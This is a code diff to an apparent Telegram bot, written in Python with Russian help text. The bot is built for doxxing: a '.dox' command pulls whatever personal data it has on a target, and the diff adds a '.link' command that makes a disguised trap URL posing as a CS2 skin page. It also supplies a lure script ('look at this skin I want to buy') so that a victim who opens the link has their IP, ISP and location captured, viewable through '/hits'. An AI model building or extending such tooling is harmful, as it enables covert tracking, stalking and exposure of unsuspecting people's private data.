@@ -80,13 +80,14 @@ async def start(m: Message):
         "4. Ты <b>отвечаешь (reply)</b> на её сообщение и пишешь <code>.dox</code>\n"
         "5. Бот присылает тебе в лс всё, что есть\n\n"
         "<b>▸ Ловушка (IP + гео)</b>\n"
-        "• Готовишь ссылку-ловушку\n"
-        "• Даёшь жертве со словами «смотри какой скин хочу купить»\n"
+        "• Делаешь ссылку: <code>.link имя_цели</code>\n"
+        "• Кидаешь жертве со словами «смотри какой скин хочу купить»\n"
         "• Жертва открывает — видит скин из CS2\n"
         "• Её IP, провайдер и местоположение уже в твоих руках\n"
         "• Пишешь боту <code>/hits</code> — смотришь результат\n\n"
         "<b>▸ Команды</b>\n"
         "<code>.dox</code> — пробить цель (reply на её сообщение)\n"
+        "<code>.link имя</code> — готовая ссылка-ловушка\n"
         "<code>/hits</code> — переходы по ловушке"
     )
 
@@ -105,6 +106,26 @@ async def dox_cmd(m: Message):
     except Exception:
         await m.answer("Напиши боту в личку /start и повтори команду.")
 
+@dp.message(Command("link"))
+async def link_cmd(m: Message):
+    args = m.text.split(maxsplit=1)
+    if len(args) < 2:
+        await m.answer(
+            "Юзай: <code>.link имя_цели</code>\n"
+            "Например: <code>.link vasya</code>\n\n"
+            "Получишь готовую ссылку — кинь её цели."
+        )
+        return
+    name = args[1].strip().replace(" ", "_")
+    url = f"{TRAP_URL}/skin/{name}"
+    await m.answer(
+        f"<b>▸ Ссылка для цели</b>\n\n"
+        f"<code>{url}</code>\n\n"
+        "Кинь жертве со словами «смотри какой скин хочу купить».\n"
+        "Она откроет — увидит скин из CS2.\n"
+        "Потом пиши <code>/hits</code>."
+    )
+
 @dp.message(Command("hits"))
 async def hits_cmd(m: Message):
     try:
@@ -115,8 +136,8 @@ async def hits_cmd(m: Message):
     if not r:
         await m.answer(
             "Хитов пока нет.\n\n"
-            "Кинь цели ссылку:\n"
-            f"<code>{TRAP_URL}/skin/имя_цели</code>"
+            "Сначала сделай ссылку: <code>.link имя_цели</code>\n"
+            "Кинь её жертве. Потом снова <code>/hits</code>."
         )
         return
     lines = ["<b>▸ HITS</b> (последние 10)"]
